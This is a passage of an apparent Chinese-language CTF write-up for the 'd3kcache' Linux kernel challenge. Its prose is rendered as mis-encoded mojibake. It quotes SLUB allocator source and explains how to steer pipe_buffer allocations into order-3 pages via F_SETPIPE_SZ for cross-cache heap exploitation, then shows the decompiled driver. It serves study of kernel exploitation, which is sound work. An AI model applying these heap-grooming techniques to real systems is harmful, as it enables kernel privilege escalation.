class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">kmalloc_slab</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (size &lt;= <span class="number">192</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!size)</span><br><span class="line"><span class="keyword">return</span> ZERO_SIZE_PTR;</span><br><span class="line"></span><br><span class="line">index = size_index[size_index_elem(size)];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">index = fls(size - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>kcalloc</code>å‡½æ•°ä¸­ä¼šåˆ°è¿™é‡Œè¿›è¡Œé€‰æ‹©cache</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">kmalloc_info_struct</span> <span class="title">kmalloc_info</span>[] __<span class="title">initconst</span> =</span> &#123;</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">0</span>, <span class="number">0</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">96</span>, <span class="number">96</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">192</span>, <span class="number">192</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8</span>, <span class="number">8</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16</span>, <span class="number">16</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32</span>, <span class="number">32</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">64</span>, <span class="number">64</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">128</span>, <span class="number">128</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">256</span>, <span class="number">256</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">512</span>, <span class="number">512</span>),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1024</span>, <span class="number">1</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2048</span>, <span class="number">2</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">4096</span>, <span class="number">4</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">8192</span>, <span class="number">8</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">16384</span>, <span class="number">16</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">32768</span>, <span class="number">32</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">65536</span>, <span class="number">64</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">131072</span>, <span class="number">128</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">262144</span>, <span class="number">256</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">524288</span>, <span class="number">512</span>k),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">1048576</span>, <span class="number">1</span>M),</span><br><span class="line">INIT_KMALLOC_INFO(<span class="number">2097152</span>, <span class="number">2</span>M)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾è¿™é‡Œé€‰æ‹©çš„æ˜¯<code>kmalloc-cg-1k</code>ã€‚ç„¶è€Œï¼Œ<code>kmalloc-cg-1k</code>æ¥è‡ªäº<code>order</code>ä¸º2çš„é¡µé¢ã€‚ä½†æ˜¯æ ¹æ®å‰é¢çš„æ„æ€æˆ‘ä»¬éœ€è¦<code>order</code>ä¸º3çš„é¡µé¢å‡ºæ¥çš„ï¼Œæ‰€ä»¥å¦‚æœè¿™é‡Œç”³è¯·çš„é¡µé¢<code>order</code>ä¸º2çš„è¯æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ã€‚</p><h3 id="pipe-bufferä¿®æ”¹åˆ†é…å¤§å°"><a href="#pipe-bufferä¿®æ”¹åˆ†é…å¤§å°" class="headerlink" title="pipe_bufferä¿®æ”¹åˆ†é…å¤§å°"></a>pipe_bufferä¿®æ”¹åˆ†é…å¤§å°</h3><p>pipeç»™äººçš„æƒŠå–œæ˜¯ä¸æ–­çš„ï¼Œpipeå¯ä»¥æä¾›äº†<code>fcntl(F_SETPIPE_SZ)</code>è°ƒç”¨å»ä¿®æ”¹æ¯ä¸ªpipeä¸­<code>pipe_buffer</code>çš„æ•°é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_set_size</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_bufs;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots, size;</span><br><span class="line"><span class="keyword">long</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  </span><br><span class="line">  size = round_pipe_size(arg);</span><br><span class="line">nr_slots = size &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nr_slots)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"></span><br><span class="line">ret = pipe_resize_ring(pipe, nr_slots);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> out_revert_acct;</span><br><span class="line"></span><br><span class="line">pipe-&gt;max_usage = nr_slots;</span><br><span class="line">pipe-&gt;nr_accounted = nr_slots;</span><br><span class="line"><span class="keyword">return</span> pipe-&gt;max_usage * PAGE_SIZE;</span><br><span class="line"></span><br><span class="line">out_revert_acct:</span><br><span class="line">(<span class="keyword">void</span>) account_pipe_buffers(pipe-&gt;user, nr_slots, pipe-&gt;nr_accounted);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸­ä¼šè°ƒç”¨åˆ°<code>pipe_resize_ring</code>å‡½æ•°ï¼Œè¿™é‡Œä¼šæ ¹æ®sizeå¾—åˆ°<code>nr_slots</code>ï¼Œè€Œåœ¨è°ƒç”¨<code>pipe_resize_ring</code>å‡½æ•°æ—¶<code>nr_slots</code>ä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pipe_resize_ring</span><span class="params">(struct pipe_inode_info *pipe, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_slots)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> head, tail, mask, n;</span><br><span class="line"></span><br><span class="line">bufs = kcalloc(nr_slots, <span class="keyword">sizeof</span>(*bufs),</span><br><span class="line">       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!bufs))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">spin_lock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line"></span><br><span class="line">n = pipe_occupancy(head, tail);</span><br><span class="line"><span class="keyword">if</span> (nr_slots &lt; n) &#123;</span><br><span class="line">spin_unlock_irq(&amp;pipe-&gt;rd_wait.lock);</span><br><span class="line">kfree(bufs);</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°çš„æ˜¯åœ¨è¿™ä¸ªå‡½æ•°å¼€å¤´çš„ä½ç½®å°±è°ƒç”¨äº†<code>kcalloc</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>fcntl</code>è°ƒç”¨ä¿®æ”¹çš„ã€‚å¦‚æœï¼Œ<code>nr_slots</code>çš„å€¼ä¸º64ï¼Œé‚£ä¹ˆç”³è¯·çš„sizeå³ä¸º<code>0xa00</code>åˆ™ä¼šç”³è¯·<code>kmalloc-4k</code>ï¼Œæ­¤æ—¶<code>order</code>ä¸º3ï¼Œå¯ä»¥å¤§å¤§æé«˜æˆåŠŸç‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">calculate_order</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> order;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> min_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> max_objects;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> nr_cpus;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Attempt to find best configuration for a slab. This</span></span><br><span class="line"><span class="comment"> * works by first attempting to generate a layout with</span></span><br><span class="line"><span class="comment"> * the best configuration and backing off gradually.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * First we increase the acceptable waste in a slab. Then</span></span><br><span class="line"><span class="comment"> * we reduce the minimum objects required in a slab.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">min_objects = slub_min_objects;</span><br><span class="line"><span class="keyword">if</span> (!min_objects) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Some architectures will only update present cpus when</span></span><br><span class="line"><span class="comment"> * onlining them, so don&#x27;t trust the number if it&#x27;s just 1. But</span></span><br><span class="line"><span class="comment"> * we also don&#x27;t want to use nr_cpu_ids always, as on some other</span></span><br><span class="line"><span class="comment"> * architectures, there can be many possible cpus, but never</span></span><br><span class="line"><span class="comment"> * onlined. Here we compromise between trying to avoid too high</span></span><br><span class="line"><span class="comment"> * order on systems that appear larger than they are, and too</span></span><br><span class="line"><span class="comment"> * low order on systems that appear smaller than they are.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">nr_cpus = num_present_cpus();</span><br><span class="line"><span class="keyword">if</span> (nr_cpus &lt;= <span class="number">1</span>)</span><br><span class="line">nr_cpus = nr_cpu_ids;</span><br><span class="line">min_objects = <span class="number">4</span> * (fls(nr_cpus) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">max_objects = order_objects(slub_max_order, size);</span><br><span class="line">min_objects = min(min_objects, max_objects);</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯èƒ½å„ä½ä¼šç–‘æƒ‘ä¸ºä»€ä¹ˆ<code>kmalloc-4k</code>çš„<code>order</code>ä¸º3ï¼Œè¿™é‡Œé‡æ–°çœ‹<code>calculate_order</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°åœ¨å¯¹<code>min_objects</code>å˜é‡èµ‹å€¼çš„æœ€åä¸€ä¸ªæ“ä½œå°±æ˜¯é€‰å–æœ€å°çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">order_objects</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> order, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)PAGE_SIZE &lt;&lt; order) / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œ<code>order_objects</code>å‡½æ•°å†…éƒ¨æ˜¯è¿™æ ·çš„ï¼Œå¹¶ä¸”æ­¤æ—¶<code>slub_max_order</code>çš„å€¼ä¸º3ï¼Œæ‰€ä»¥å½“sizeä¸º4kæ—¶ä¹Ÿå°±æ˜¯<code>0x1000</code>æ—¶<code>max_objects</code>çš„å€¼ä¸º0x8ï¼Œæ‰€ä»¥æŒ‰ç…§è¿™æ ·è®¡ç®—çš„è¯åç»­æ±‚å¾—çš„<code>order</code>ä¸º3ã€‚</p><h2 id="d3kcache"><a href="#d3kcache" class="headerlink" title="d3kcache"></a>d3kcache</h2><p>å‰é¢é“ºå«äº†è¿™ä¹ˆå¤šç»ˆäºåˆ°äº†é¢˜ç›®äº†ï¼Œå¦‚æœæœ‰äº†å‰é¢æåˆ°çš„æ‰€æœ‰åŸºç¡€ç†è®ºçŸ¥è¯†å†æ¥çœ‹è¿™é“é¢˜çš„è¯ï¼Œ<del>ä¾æ—§æ— æ³•å¾ˆè½»æ¾çš„å®Œæˆ</del>ã€‚</p><p>é¢˜ç›®åœ¨å¼€äº†åŸºæœ¬çš„ä¿æŠ¤ä¹‹å¤–è¿˜å¼€å¯äº†å¾ˆå¤šçš„ç¼–è¯‘é€‰é¡¹ä¸­çš„ä¿æŠ¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_STATIC_USERMODEHELPER=y</span><br><span class="line">CONFIG_STATIC_USERMODEHELPER_PATH=<span class="string">&quot;&quot;</span></span><br><span class="line">CONFIG_SLUB=y</span><br><span class="line">CONFIG_SLAB_FREELIST_RANDOM=y</span><br><span class="line">CONFIG_SLAB_FREELIST_HARDENED=y</span><br><span class="line">CONFIG_HARDENED_USERCOPY=y</span><br></pre></td></tr></table></figure><p>è¿™äº›åŸºæœ¬çš„éƒ½æ˜¯å¼€å¯äº†çš„ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜å¼€å¯äº†ä¸€ä¸ª<code>Control Flow Integrity</code>ä¿æŠ¤ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure><p>è€Œè¿™ä¸ªä¿æŠ¤ä¼šæ£€æµ‹opsæ˜¯å¦åˆæ³•ï¼Œè¿™ä¸ªæ£€æµ‹ååˆ†ä¸¥æ ¼ï¼Œéœ€è¦opsçš„å€¼ä¸ä¸€ä¸ªå›ºå®šçš„å†…å®¹è¿›è¡Œå¼‚æˆ–ï¼Œç»“æœä¸ä¸º0å°±ç›´æ¥è§¦å‘<code>kernel panic</code>ã€‚ä¹Ÿå°±æ˜¯å› ä¸ºå½“æ—¶ä¸æ¸…æ¥šè¿™ä¸ªå†…å®¹å¯¼è‡´æˆ‘è°ƒäº†åŠå¤©å»åŠ«æŒ<code>pipe_buffer</code>çš„opsæŒ‡é’ˆã€‚</p><h3 id="é©±åŠ¨åˆ†æ"><a href="#é©±åŠ¨åˆ†æ" class="headerlink" title="é©±åŠ¨åˆ†æ"></a>é©±åŠ¨åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line"></span><br><span class="line">  printk(&amp;unk_96B);</span><br><span class="line">  major_num = _register_chrdev(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_fo);</span><br><span class="line">  <span class="keyword">if</span> ( major_num &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    module_class = _class_create(&amp;_this_module, <span class="string">&quot;d3kcache&quot;</span>, &amp;d3kcache_module_init___key);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_class &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_A0D);</span><br><span class="line">      v0 = <span class="number">0</span>;</span><br><span class="line">      module_device = device_create(module_class, <span class="number">0LL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(major_num &lt;&lt; <span class="number">20</span>), <span class="number">0LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)module_device &lt; <span class="number">0xFFFFFFFFFFFFF001</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_A66);</span><br><span class="line">        spin = <span class="number">0</span>;</span><br><span class="line">        kcache_jar = kmem_cache_create_usercopy(<span class="string">&quot;kcache_jar&quot;</span>, <span class="number">0x800</span>LL, <span class="number">0LL</span>, <span class="number">67379200LL</span>, <span class="number">0LL</span>, <span class="number">2048LL</span>, <span class="number">0LL</span>);</span><br><span class="line">        <span class="built_in">memset</span>(kcache_list, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        class_destroy(module_class);</span><br><span class="line">        _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">        printk(&amp;unk_A3B);</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_device;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      _unregister_chrdev((<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num, <span class="number">0LL</span>, <span class="number">256LL</span>, <span class="string">&quot;d3kcache&quot;</span>);</span><br><span class="line">      printk(&amp;unk_9DE);</span><br><span class="line">      <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)module_class;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_9AD);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)major_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆçœ‹åˆå§‹åŒ–æ¨¡å—éƒ¨åˆ†ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢è°ƒç”¨äº†å‰é¢æåˆ°çš„<code>kmem_cache_create_usercopy</code>å‡½æ•°ï¼Œå¹¶ä¸”å‚æ•°ä¸­sizeæŒ‡å®šä¸º<code>0x800</code>ï¼Œé‚£ä¹ˆæ ¹æ®å‰é¢æ‰€ä»¥åˆ°çš„ï¼Œè¿™é‡Œçš„orderå³ä¸º3ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">d3kcache_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v8; <span class="comment">// r14</span></span><br><span class="line">  __int64 v9; <span class="comment">// r15</span></span><br><span class="line">  __int64 v10; <span class="comment">// r12</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// r14</span></span><br><span class="line">  __int64 v14; <span class="comment">// r15</span></span><br><span class="line">  __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  __int64 v16; <span class="comment">// r15</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v17; <span class="comment">// r13d</span></span><br><span class="line">  __int64 v18; <span class="comment">// r14</span></span><br><span class="line">  __int64 v19; <span class="comment">// r12</span></span><br><span class="line">  __int64 v20; <span class="comment">// r14</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v21; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v22; <span class="comment">// rax</span></span><br><span class="line">  __int64 